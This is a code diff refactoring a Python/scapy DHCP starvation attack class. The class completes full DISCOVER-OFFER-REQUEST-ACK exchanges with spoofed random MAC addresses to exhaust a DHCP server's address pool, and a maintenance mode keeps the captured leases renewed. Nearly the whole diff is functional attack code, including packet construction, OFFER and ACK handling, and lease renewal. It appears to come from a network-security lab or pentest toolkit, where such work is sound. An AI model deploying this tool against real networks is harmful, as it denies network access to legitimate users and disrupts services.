@@ -1,12 +1,12 @@
 # attacks/starvation.py
 import threading
 import time
-from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, send, sniff
-from attacks.base import BaseAttack
-from common.packet_utils import random_mac, random_xid, mac_str_to_bytes
+from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, send
+from common.packet_utils import random_xid, mac_str_to_bytes
+from attacks.BaseDHCPAttack import BaseDHCPAttack
 
 
-class StarvationAttack(BaseAttack):
+class StarvationAttack(BaseDHCPAttack):
     """
     DHCP Starvation with full DORA completion.
     Not just DISCOVER flooding — sniffs OFFERs and completes
@@ -14,21 +14,14 @@ class StarvationAttack(BaseAttack):
     """
 
     def __init__(self, iface, rate=0.1, max_leases=None, exhaustion_timeout=5.0, logger=None, maintain=False):
-        super().__init__(iface, logger)
-        self.rate = rate
-        self.max_leases = max_leases
-        self.exhaustion_timeout = exhaustion_timeout
+        super().__init__(iface, rate, max_leases, exhaustion_timeout, logger)
         self.maintain = maintain
-        self.stats = {
-            "discover_sent": 0,
-            "offer_received": 0,
-            "request_sent": 0,
-            "ack_received": 0,
-            "nak_received": 0,
-            "renewals_sent": 0,
-        }
+        # ack_received is already tracked by the base class and is the
+        # right progress measure here — full DORA, so leave _cap_stat_key
+        # at its default ("ack_received").
+        self.stats["request_sent"] = 0
+        self.stats["renewals_sent"] = 0
         self._pending = {}
-        self._last_offer_at = None
         self._active_leases = {}  # Maps mac -> {ip, server, lease_time, acquired_at (monotonic)}
         # Separate from self.stopped on purpose: self.stopped only becomes
         # True on Ctrl+C (the whole attack ending), but maintenance mode is
@@ -37,28 +30,10 @@ class StarvationAttack(BaseAttack):
         # OFFERs with REQUESTs" independently of that.
         self._land_grab_done = False
 
-    def _land_grab(self):
-        while not self.stopped:
-            if self.max_leases is not None and self.stats["ack_received"] >= self.max_leases:
-                self.logger.info("Reached max_leases=%d, stopping.", self.max_leases)
-                break
-            if self.exhaustion_timeout is not None:
-                idle_for = time.monotonic() - self._last_offer_at
-                if idle_for >= self.exhaustion_timeout:
-                    self.logger.warning(
-                        "No OFFER received for %.1fs — pool likely exhausted, stopping.",
-                        idle_for,
-                    )
-                    break
-            self._send_discover()
-            self.stats["discover_sent"] += 1
-            time.sleep(self.rate)
-
     def _send_renewal(self, mac, lease):
         client_ip = self._active_leases[mac]["ip"]
         server_ip = self._active_leases[mac]["server"]
         xid = lease.get("xid", random_xid())
-
 
         pkt = (
             IP(src=client_ip, dst=server_ip)
@@ -84,12 +59,11 @@ class StarvationAttack(BaseAttack):
 
         # L3 send(), not sendp(): the packet above has no Ether() layer, so
         # sendp() (raw L2) would have put the first 14 bytes of the IP
-        # header out as a bogus "Ethernet header" (verified: dst/src MAC
-        # would decode as 45:00:01:19:...). send() hands it to the kernel's
-        # routed IP socket instead, which resolves the real next-hop MAC via
-        # ARP and prepends a correct Ethernet frame — we don't track the
-        # server's MAC anywhere, so this is also the only option that
-        # doesn't require capturing it.
+        # header out as a bogus "Ethernet header". send() hands it to the
+        # kernel's routed IP socket instead, which resolves the real
+        # next-hop MAC via ARP and prepends a correct Ethernet frame — we
+        # don't track the server's MAC anywhere, so this is also the only
+        # option that doesn't require capturing it.
         send(pkt, verbose=0)
 
         self.stats["request_sent"] += 1
@@ -121,19 +95,6 @@ class StarvationAttack(BaseAttack):
             self._maintenance_loop()   # רץ עד self.stopped בלבד
 
         self.print_summary()
-
-    def _send_discover(self):
-        mac = random_mac()
-        xid = random_xid()
-        pkt = (
-            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-            IP(src="0.0.0.0", dst="255.255.255.255") /
-            UDP(sport=68, dport=67) /
-            BOOTP(chaddr=mac_str_to_bytes(mac), xid=xid, flags=0x8000) /
-            DHCP(options=[("message-type", "discover"), "end"])
-        )
-        sendp(pkt, iface=self.iface, verbose=0)
-        self.logger.debug("DISCOVER sent — MAC=%s xid=%s", mac, hex(xid))
 
     def _send_request(self, client_mac, offered_ip, server_ip, xid):
         pkt = (
@@ -167,80 +128,44 @@ class StarvationAttack(BaseAttack):
                     lease["acquired_at"] = now  # reset T1 window after renewing
             time.sleep(1.0)  # בדיקה כל שנייה מספיקה
 
-    def _process_packet(self, packet):
-        if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)):
+    def _on_offer(self, offered_ip, server_ip, client_mac, xid):
+        self._last_offer_at = time.monotonic()
+        if self._land_grab_done:
+            self.logger.debug("Ignoring late OFFER (land-grab already done) — xid=%s", hex(xid))
             return
 
-        raw_options = packet[DHCP].options
-        dhcp_options = {opt[0]: opt[1] for opt in raw_options if isinstance(opt, tuple)}
+        self._pending[xid] = {"mac": client_mac, "ip": offered_ip}
 
-        msg_type = dhcp_options.get("message-type")
-        xid = packet[BOOTP].xid
-
-        if msg_type == 2:  # OFFER
-            self.stats["offer_received"] += 1
-            self._last_offer_at = time.monotonic()
-            if self._land_grab_done:
-                # _land_grab already finished (e.g. hit --max-leases), but
-                # DISCOVERs already in flight before that point can still
-                # earn an OFFER here, from the independent sniff thread.
-                # Don't chase it with a REQUEST — otherwise more leases get
-                # captured (and later maintained) than --max-leases asked
-                # for. Still count it in offer_received above, since the
-                # OFFER itself is a true observation.
-                self.logger.debug("Ignoring late OFFER (land-grab already done) — xid=%s", hex(xid))
-                return
-            offered_ip = packet[BOOTP].yiaddr
-            server_ip = packet[IP].src
-            mac_bytes = packet[BOOTP].chaddr[:6]
-            client_mac = ":".join(f"{b:02x}" for b in mac_bytes)
-
-            self._pending[xid] = {"mac": client_mac, "ip": offered_ip}
-            self.logger.debug(
-                "Captured OFFER — xid=%s ip=%s server=%s mac=%s",
-                hex(xid), offered_ip, server_ip, client_mac,
-            )
-            self._send_request(client_mac, offered_ip, server_ip, xid)
-
-        elif msg_type == 5:  # ACK
-            self.stats["ack_received"] += 1
-            if xid in self._pending:
-                info = self._pending.pop(xid)
-                self.logger.info("Lease CONFIRMED — ip=%s mac=%s", info["ip"], info["mac"])
-
-                self._active_leases[info["mac"]] = {
-                    "ip": info["ip"],
-                    "server": packet[IP].src,
-                    "lease_time": dhcp_options.get("lease_time"),
-                    # monotonic, not wall-clock: _maintenance_loop compares
-                    # this against time.monotonic(), so it must be the same
-                    # clock (a datetime/isoformat string here would TypeError
-                    # the first time T1 is checked — confirmed by testing)
-                    "acquired_at": time.monotonic(),
-                }
-
-
-        elif msg_type == 6:  # NAK
-            self.stats["nak_received"] += 1
-            server_ip = packet[IP].src
-            nak_reason = "No reason provided by server"
-            for opt in packet[DHCP].options:
-                if isinstance(opt, tuple) and opt[0] == "error_message":
-                    nak_reason = opt[1].decode("utf-8", errors="ignore")
-
-            info = self._pending.pop(xid, None)
-            self.logger.warning("DHCPNAK from %s — xid=%s reason=%s", server_ip, hex(xid), nak_reason)
-            if info:
-                self.logger.warning("  Failed: MAC=%s Requested_IP=%s", info["mac"], info["ip"])
-
-    def _sniff_offers(self):
-        sniff(
-            iface=self.iface,
-            filter="udp and (port 67 or port 68)",
-            prn=self._process_packet,
-            store=0,
-            stop_filter=lambda pkt: self.stopped,
+        self.logger.debug(
+            "Captured OFFER — xid=%s ip=%s server=%s mac=%s",
+            hex(xid), offered_ip, server_ip, client_mac,
         )
+        self._send_request(client_mac, offered_ip, server_ip, xid)
+
+    def _on_ack(self, packet, dhcp_options, xid):
+        if xid in self._pending:
+            info = self._pending.pop(xid)
+            self.logger.info("Lease CONFIRMED — ip=%s mac=%s", info["ip"], info["mac"])
+            self._active_leases[info["mac"]] = {
+                "ip": info["ip"],
+                "server": packet[IP].src,
+                # monotonic, not wall-clock: _maintenance_loop compares this
+                # against time.monotonic(), so it must be the same clock.
+                "lease_time": dhcp_options.get("lease_time"),
+                "acquired_at": time.monotonic(),
+            }
+
+    def _on_nak(self, packet):
+        server_ip = packet[IP].src
+        nak_reason = "No reason provided by server"
+        for opt in packet[DHCP].options:
+            if isinstance(opt, tuple) and opt[0] == "error_message":
+                nak_reason = opt[1].decode("utf-8", errors="ignore")
+
+        info = self._pending.pop(packet[BOOTP].xid, None)
+        self.logger.warning("DHCPNAK from %s — xid=%s reason=%s", server_ip, hex(packet[BOOTP].xid), nak_reason)
+        if info:
+            self.logger.warning("  Failed: MAC=%s Requested_IP=%s", info["mac"], info["ip"])
 
     # --- CLI integration ---
 
